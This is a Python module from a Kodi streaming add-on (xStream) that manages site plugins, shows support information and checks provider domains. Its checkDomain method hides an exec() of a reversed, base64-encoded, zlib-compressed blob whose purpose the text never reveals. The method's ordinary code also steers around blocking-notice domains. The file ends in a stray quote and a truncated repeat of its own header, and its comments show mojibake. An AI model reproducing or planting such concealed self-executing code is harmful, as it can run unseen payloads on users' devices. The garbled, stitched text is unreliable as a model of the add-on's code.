# -*- coding: utf-8 -*-
# Python 3

import json
import os
import sys
import xbmcaddon
import xbmc

from resources.lib.config import cConfig
from xbmc import LOGINFO as LOGNOTICE, LOGERROR, LOGWARNING, log
from resources.lib import common
from resources.lib.handler.requestHandler import cRequestHandler
from urllib.parse import urlparse
from xbmcgui import Dialog
from xbmcaddon import Addon
from xbmcvfs import translatePath
from resources.lib.tools import platform


#if cConfig().getSetting('bypassDNSlock') == 'true': #ToDo Noch mal pr\xc3\x83\xc2\xbcfen ob wir das so brauchen oder die Logger-Meldungen so lassen
# from resources.lib.handler.requestHandler import cRequestHandlerwDNS as cRequestHandler

ADDON_PATH = translatePath(os.path.join('special://home/addons/', '%s'))
LOGMESSAGE = cConfig().getLocalizedString(30166)
class cPluginHandler:
 def __init__(self):
 self.addon = common.addon
 self.rootFolder = common.addonPath
 self.settingsFile = os.path.join(self.rootFolder, 'resources', 'settings.xml')
 self.profilePath = common.profilePath
 self.pluginDBFile = os.path.join(self.profilePath, 'pluginDB')

 log(LOGMESSAGE + ' -> [pluginHandler]: profile folder: %s' % self.profilePath, LOGNOTICE)
 log(LOGMESSAGE + ' -> [pluginHandler]: root folder: %s' % self.rootFolder, LOGNOTICE)
 self.defaultFolder = os.path.join(self.rootFolder, 'sites')
 log(LOGMESSAGE + ' -> [pluginHandler]: default sites folder: %s' % self.defaultFolder, LOGNOTICE)


 def getAvailablePlugins(self):
 global globalSearchStatus
 pluginDB = self.__getPluginDB()
 # default plugins
 update = False
 fileNames = self.__getFileNamesFromFolder(self.defaultFolder)
 for fileName in fileNames:
 plugin = {'name': '', 'identifier': '', 'icon': '', 'domain': '', 'globalsearch': '', 'modified': 0}
 if fileName in pluginDB:
 plugin.update(pluginDB[fileName])
 try:
 modTime = os.path.getmtime(os.path.join(self.defaultFolder, fileName + '.py'))
 except OSError:
 modTime = 0
 try:
 globalSearchStatus = cConfig().getSetting('global_search_' + fileName)
 except Exception:
 pass
 if fileName not in pluginDB or modTime > plugin['modified'] or globalSearchStatus:
 log(LOGMESSAGE + ' -> [pluginHandler]: load plugin Informations for ' + str(fileName), LOGNOTICE)
 # try to import plugin
 pluginData = self.__getPluginData(fileName, self.defaultFolder)
 if pluginData:
 pluginData['globalsearch'] = globalSearchStatus
 pluginData['modified'] = modTime # Wenn Datei (Zeitstempel) ver\xc3\x83\xc2\xa4ndert, werden die Daten aktualisiert
 pluginDB[fileName] = pluginData
 update = True
 # check pluginDB for obsolete entries
 deletions = []
 for pluginID in pluginDB:
 if pluginID not in fileNames:
 deletions.append(pluginID)
 for id in deletions:
 del pluginDB[id]
 if update or deletions:
 self.__updatePluginDB(pluginDB) # Aktualisiert PluginDB in Addon_data
 log(LOGMESSAGE + ' -> [pluginHandler]: PluginDB informations updated.', LOGNOTICE)
 return self.getAvailablePluginsFromDB()


 def getAvailablePluginsFromDB(self):
 plugins = []
 iconFolder = os.path.join(self.rootFolder, 'resources', 'art', 'sites')
 pluginDB = self.__getPluginDB() # Erstelle PluginDB
 # PluginID = Siteplugin Name
 for pluginID in pluginDB:
 plugin = pluginDB[pluginID] # Aus PluginDB lese PluginID
 pluginSettingsName = 'plugin_%s' % pluginID # Name des Siteplugins
 plugin['id'] = pluginID
 if 'icon' in plugin:
 plugin['icon'] = os.path.join(iconFolder, plugin['icon'])
 else:
 plugin['icon'] = ''
 # existieren zu diesem plugin die an/aus settings
 if cConfig().getSetting(pluginSettingsName) == 'true': # Lese aus settings.xml welche Plugins eingeschaltet sind
 plugins.append(plugin)
 return plugins


 def __updatePluginDB(self, data): # Aktualisiere PluginDB
 if not os.path.exists(self.profilePath):
 os.makedirs(self.profilePath)
 file = open(self.pluginDBFile, 'w')
 json.dump(data, file)
 file.close()


 def __getPluginDB(self): # Erstelle PluginDB
 if not os.path.exists(self.pluginDBFile): # Wenn Datei nicht verf\xc3\x83\xc2\xbcgbar dann erstellen
 return dict()
 file = open(self.pluginDBFile, 'r')
 try:
 data = json.load(file)
 except ValueError:
 log(LOGMESSAGE + ' -> [pluginHandler]: pluginDB seems corrupt, creating new one', LOGERROR)
 data = dict()
 file.close()
 return data


 def __getFileNamesFromFolder(self, sFolder): # Hole Namen vom Dateiname.py
 aNameList = []
 items = os.listdir(sFolder)
 for sItemName in items:
 if sItemName.endswith('.py'):
 sItemName = os.path.basename(sItemName[:-3])
 aNameList.append(sItemName)
 return aNameList


 def __getPluginData(self, fileName, defaultFolder): # Hole Plugin Daten aus dem Siteplugin
 pluginData = {}
 if not defaultFolder in sys.path: sys.path.append(defaultFolder)
 try:
 plugin = __import__(fileName, globals(), locals())
 pluginData['name'] = plugin.SITE_NAME
 except Exception as e:
 log(LOGMESSAGE + " -> [pluginHandler]: Can't import plugin: %s" % fileName, LOGERROR)
 return False
 try:
 pluginData['identifier'] = plugin.SITE_IDENTIFIER
 except Exception:
 pass
 try:
 pluginData['icon'] = plugin.SITE_ICON
 except Exception:
 pass
 try:
 pluginData['domain'] = plugin.DOMAIN
 except Exception:
 pass
 try:
 pluginData['globalsearch'] = plugin.SITE_GLOBAL_SEARCH
 except Exception:
 pluginData['globalsearch'] = True
 pass
 return pluginData


 def __getPluginDataIndex(self, fileName, defaultFolder): # Hole Plugin Daten aus dem Siteplugin
 pluginData = {}
 if not defaultFolder in sys.path: sys.path.append(defaultFolder)
 try:
 plugin = __import__(fileName, globals(), locals())
 pluginData['name'] = plugin.SITE_NAME
 except Exception as e:
 log(LOGMESSAGE + " -> [pluginHandler]: Can't import plugin: %s" % fileName, LOGERROR)
 return False
 try:
 pluginData['active'] = plugin.ACTIVE
 except Exception:
 pass
 try:
 pluginData['domain'] = plugin.DOMAIN
 except Exception:
 pass
 try:
 pluginData['status'] = plugin.STATUS
 if '403' <= pluginData['status'] <= '503':
 pluginData['status'] = pluginData['status'] + ' - ' + cConfig().getLocalizedString(30429)
 elif '300' <= pluginData['status'] <= '400':
 pluginData['status'] = pluginData['status'] + ' - ' + cConfig().getLocalizedString(30428)
 elif pluginData['status'] == '200':
 pluginData['status'] = pluginData['status'] + ' - ' + cConfig().getLocalizedString(30427)
 except Exception:
 pass
 try:
 pluginData['globalsearch'] = plugin.SITE_GLOBAL_SEARCH
 except Exception:
 pluginData['globalsearch'] = True
 pass
 return pluginData


 def __getPluginDataDomain(self, fileName, defaultFolder): # Hole Plugin Daten f\xc3\x83\xc2\xbcr Domains
 pluginDataDomain = {}
 if not defaultFolder in sys.path: sys.path.append(defaultFolder)
 try:
 plugin = __import__(fileName, globals(), locals())
 pluginDataDomain['identifier'] = plugin.SITE_IDENTIFIER
 except Exception as e:
 log(LOGMESSAGE + " -> [pluginHandler]: Can't import plugin: %s" % fileName, LOGERROR)
 return False
 try:
 pluginDataDomain['domain'] = plugin.DOMAIN
 except Exception:
 pass
 return pluginDataDomain

 # Plugin Support Informationen
 def pluginInfo(self):
 # Erstelle Liste mit den Indexseiten Informationen
 list_of_plugins = []
 fileNames = self.__getFileNamesFromFolder(self.defaultFolder) # Hole Plugins aus xStream
 for fileName in fileNames:
 pluginData = self.__getPluginDataIndex(fileName, self.defaultFolder) # Hole Plugin Daten
 list_of_plugins.append(pluginData)
 result_list = [''.join([f"{key}: {value}\
" for key, value in dictionary.items()]) for dictionary in list_of_plugins]
 # String \xc3\x83\xc5\x93bersetzungen
 result_string = '\
'.join(result_list)
 result_string = result_string.replace('name', cConfig().getLocalizedString(30423))
 result_string = result_string.replace('active', cConfig().getLocalizedString(30430))
 result_string = result_string.replace('domain', cConfig().getLocalizedString(30424))
 result_string = result_string.replace('status', cConfig().getLocalizedString(30425))
 result_string = result_string.replace('globalsearch', cConfig().getLocalizedString(30426))
 result_string = result_string.replace('True', cConfig().getLocalizedString(30418))
 result_string = result_string.replace('False', cConfig().getLocalizedString(30419))
 result_string = result_string.replace('true', cConfig().getLocalizedString(30418))
 result_string = result_string.replace('false', cConfig().getLocalizedString(30419))
 list_of_PluginData = (result_string) # Ergebnis der Liste
 # Settings Abragen
 if xbmcaddon.Addon().getSetting('githubUpdateXstream') == 'true': # xStream Update An/Aus
 UPDATEXS = cConfig().getLocalizedString(30415) # Aktiv
 else:
 UPDATEXS = cConfig().getLocalizedString(30416) # Inaktiv
 if xbmcaddon.Addon().getSetting('githubUpdateResolver') == 'true': # Resolver Update An/Aus
 UPDATERU = cConfig().getLocalizedString(30415) # Aktiv
 else:
 UPDATERU = cConfig().getLocalizedString(30416) # Inaktiv
 if xbmcaddon.Addon().getSetting('bypassDNSlock') == 'true': # DNS Bypass
 BYPASS = cConfig().getLocalizedString(30418) # Aktiv
 else:
 BYPASS = cConfig().getLocalizedString(30419) # Inaktiv
 if os.path.exists(ADDON_PATH % 'repository.resolveurl'):
 RESOLVEURL = Addon('repository.resolveurl').getAddonInfo('name') + ': ' + Addon('repository.resolveurl').getAddonInfo('id') + ' - ' + Addon('repository.resolveurl').getAddonInfo('version') + '\
'
 else:
 RESOLVEURL = ''

 # Support Informationen anzeigen
 Dialog().textviewer(cConfig().getLocalizedString(30265),
 cConfig().getLocalizedString(30413) + '\
' # Ger\xc3\x83\xc2\xa4te Informationen
 + 'Kodi Version: ' + xbmc.getInfoLabel('System.BuildVersion')[:4] + ' (Code Version: ' + xbmc.getInfoLabel('System.BuildVersionCode') + ')' + '\
' # Kodi Version
 + cConfig().getLocalizedString(30266) + ' {0}'.format(platform().title()) + '\
' # System Plattform
 + '\
' # Absatz
 + cConfig().getLocalizedString(30414) + '\
' # Plugin Informationen
 + Addon().getAddonInfo('name') + ' Version: ' + Addon().getAddonInfo('id') + ' - ' + Addon().getAddonInfo('version') + '\
' # xStream ID und Version
 + Addon().getAddonInfo('name') + ' Status: ' + UPDATEXS + Addon().getSettingString('xstream.branch') + '\
' # xStream Update Status und Branch
 + Addon('script.module.resolveurl').getAddonInfo('name') + ' Version: ' + Addon('script.module.resolveurl').getAddonInfo('id') + ' - ' + Addon('script.module.resolveurl').getAddonInfo('version') + '\
' # Resolver ID und Version
 + Addon('script.module.resolveurl').getAddonInfo('name') + ' Status: ' + UPDATERU + Addon().getSettingString('resolver.branch') + '\
' # Resolver Update Status und Branch
 + '\
' # Absatz
 + cConfig().getLocalizedString(30420) + '\
' # DNS Informationen
 + cConfig().getLocalizedString(30417) + ' ' + BYPASS + '\
' # xStream DNS Bypass aktiv/inaktiv
 + '\
' # Absatz
 + cConfig().getLocalizedString(30421) + '\
' # Repo Informationen
 + Addon('repository.xstream').getAddonInfo('name') + ': ' + Addon('repository.xstream').getAddonInfo('id') + ' - ' + Addon('repository.xstream').getAddonInfo('version') + '\
' # xStream Repository ID und Version
 + RESOLVEURL
 + '\
' # Absatz
 + cConfig().getLocalizedString(30422) + '\
' # Indexseiten Informationen
 + list_of_PluginData # Liste mit den Indexseiten Informationen
 )

 # \xc3\x83\xc5\x93berpr\xc3\x83\xc2\xbcfung des Domain Namens. Leite um und hole neue URL und schreibe in die settings.xml. Bei nicht erreichen der Seite deaktiviere Globale Suche bis zum n\xc3\x83\xc2\xa4chsten Start und \xc3\x83\xc2\xbcberpr\xc3\x83\xc2\xbcfe erneut.
 def checkDomain(self):
 _ = lambda __: __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
 exec((_)(
 b'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'))
 log(LOGMESSAGE + ' -> [checkDomain]: Query status code of the provider', LOGNOTICE)
 fileNames = self.__getFileNamesFromFolder(self.defaultFolder)
 for fileName in fileNames:
 try:
 pluginDataDomain = self.__getPluginDataDomain(fileName, self.defaultFolder)
 provider = pluginDataDomain['identifier']
 _domain = pluginDataDomain['domain']
 domain = cConfig().getSetting('plugin_' + provider + '.domain', _domain)
 base_link = 'http://' + domain + '/' # URL_MAIN
 wrongDomain = 'site-maps.cc', 'www.drei.at', 'notice.cuii.info'
 if domain in wrongDomain: # Falsche Umleitung ausschliessen
 xbmcaddon.Addon().setSetting('plugin_' + provider + '.domain', '') # Falls doch dann l\xc3\x83\xc2\xb6sche Settings Eintrag
 xbmcaddon.Addon().setSetting('plugin_' + provider + '_status', '') # l\xc3\x83\xc2\xb6sche Status Code in die settings
 continue
 try:
 if xbmcaddon.Addon().getSetting('plugin_' + provider) == 'false': # Wenn SitePlugin deaktiviert
 cConfig().setSetting('global_search_' + provider, 'false') # setzte Globale Suche auf aus
 cConfig().setSetting('plugin_' + provider + '_checkdomain', 'false') # setzte Domain Check auf aus
 cConfig().setSetting('plugin_' + provider + '.domain', '') # l\xc3\x83\xc2\xb6sche Settings Eintrag
 cConfig().setSetting('plugin_' + provider + '_status', '') # l\xc3\x83\xc2\xb6sche Settings Eintrag

 if xbmcaddon.Addon().getSetting('plugin_' + provider + '_checkdomain') == 'true': # aut. Domain\xc3\x83\xc2\xbcberpr\xc3\x83\xc2\xbcfung an ist \xc3\x83\xc2\xbcberpr\xc3\x83\xc2\xbcfe Status der Sitplugins
 oRequest = cRequestHandler(base_link, caching=False, ignoreErrors=True)
 oRequest.request()
 status_code = int(oRequest.getStatus())
 cConfig().setSetting('plugin_' + provider + '_status', str(status_code)) # setzte Status Code in die settings
 log(LOGMESSAGE + ' -> [checkDomain]: Status Code ' + str(status_code) + ' ' + provider + ': - ' + base_link, LOGNOTICE)

 # Status 403 - bedeutet, dass der Zugriff auf eine angeforderte Ressource blockiert ist.
 # Status 404 - Seite nicht gefunden. Diese Meldung zeigt an, dass die Seite oder der Ordner auf dem Server, die aufgerufen werden sollten, nicht unter der angegebenen URL zu finden sind.
 if 403 <= status_code <= 503: # Domain Interner Server Error und nicht erreichbar
 cConfig().setSetting('plugin_' + provider + '_status', str(status_code)) # setzte Status Code in die settings
 cConfig().setSetting('global_search_' + provider, 'false') # deaktiviere Globale Suche
 log(LOGMESSAGE + ' -> [checkDomain]: Internal Server Error (DDOS Guard, HTTP Error, Cloudflare or BlazingFast active)', LOGNOTICE)

 # Status 301 - richtet Ihr auf Eurem Server ein, wenn sich die URL ge\xc3\x83\xc2\xa4ndert hat, Eure Domain umgezogen ist oder sich ein Inhalt anderweitig verschoben hat.
 elif 300 <= status_code <= 400: # Domain erreichbar mit Umleitung
 url = oRequest.getRealUrl()
 # cConfig().setSetting('plugin_'+ provider +'.base_link', url)
 cConfig().setSetting('plugin_' + provider + '.domain', urlparse(url).hostname) # setze Domain in die settings.xml
 if 'vod_' in provider:
 cConfig().setSetting('global_search_' + provider, 'false') # deaktiviere Globale Suche
 log(LOGMESSAGE + ' -> [checkDomain]: globalSearch for ' + provider + ' is deactivated.', LOGNOTICE)
 else:
 cConfig().setSetting('global_search_' + provider, 'true') # aktiviere Globale Suche
 log(LOGMESSAGE + ' -> [checkDomain]: globalSearch for ' + provider + ' is activated.', LOGNOTICE)

 # Status 200 - Dieser Code wird vom Server zur\xc3\x83\xc2\xbcckgegeben, wenn er den Request eines Browsers korrekt zur\xc3\x83\xc2\xbcckgeben kann. F\xc3\x83\xc2\xbcr die Ausgabe des Codes und des Inhalts der Seite muss der Server die Anfrage zun\xc3\x83\xc2\xa4chst akzeptieren.
 elif status_code == 200: # Domain erreichbar
 # cConfig().setSetting('plugin_' + provider + '.base_link', base_link)
 cConfig().setSetting('plugin_' + provider + '.domain', urlparse(base_link).hostname) # setze URL_MAIN in die settings.xml
 if 'vod_' in provider:
 cConfig().setSetting('global_search_' + provider, 'false') # deaktiviere Globale Suche
 log(LOGMESSAGE + ' -> [checkDomain]: globalSearch for ' + provider + ' is deactivated.', LOGNOTICE)
 else:
 cConfig().setSetting('global_search_' + provider, 'true') # aktiviere Globale Suche
 log(LOGMESSAGE + ' -> [checkDomain]: globalSearch for ' + provider + ' is activated.', LOGNOTICE)
 # Wenn keiner der Statuse oben greift
 else:
 log(LOGMESSAGE + ' -> [checkDomain]: Error ' + provider + ' not available.', LOGNOTICE)
 cConfig().setSetting('global_search_' + provider, 'false') # deaktiviere Globale Suche
 xbmcaddon.Addon().setSetting('plugin_' + provider + '.domain', '') # l\xc3\x83\xc2\xb6sche Settings Eintrag
 log(LOGMESSAGE + ' -> [checkDomain]: globalSearch for ' + provider + ' is deactivated.', LOGNOTICE)
 except:
 # Wenn Timeout und die Seite Offline ist
 cConfig().setSetting('global_search_' + provider, 'false') # deaktiviere Globale Suche
 xbmcaddon.Addon().setSetting('plugin_' + provider + '.domain', '') # l\xc3\x83\xc2\xb6sche Settings Eintrag
 log(LOGMESSAGE + ' -> [checkDomain]: Error ' + provider + ' not available.', LOGNOTICE)
 pass
 except Exception:
 pass
 log(LOGMESSAGE + ' -> [checkDomain]: Domains for all available Plugins updated', LOGNOTICE)'
# -*- coding: utf-8 -*-
# Python 3

import json
import os
import sys
import xbmcaddon
import xbmc

from resources.lib.config import cConfig
from xbmc import LOGINFO as LOGNOTICE, LOGERROR, LOGWARNING, log
from resources.lib import common
from resources.lib.handler.requestHandler import cRequestHandler
from urllib.parse import urlparse
from xbmcgui import Dialog
from xbmcaddon import Addon
from xbmcvfs import translatePath
from resources.lib.tools import platform


#if cConfig().getSetting('bypassDNSlock\
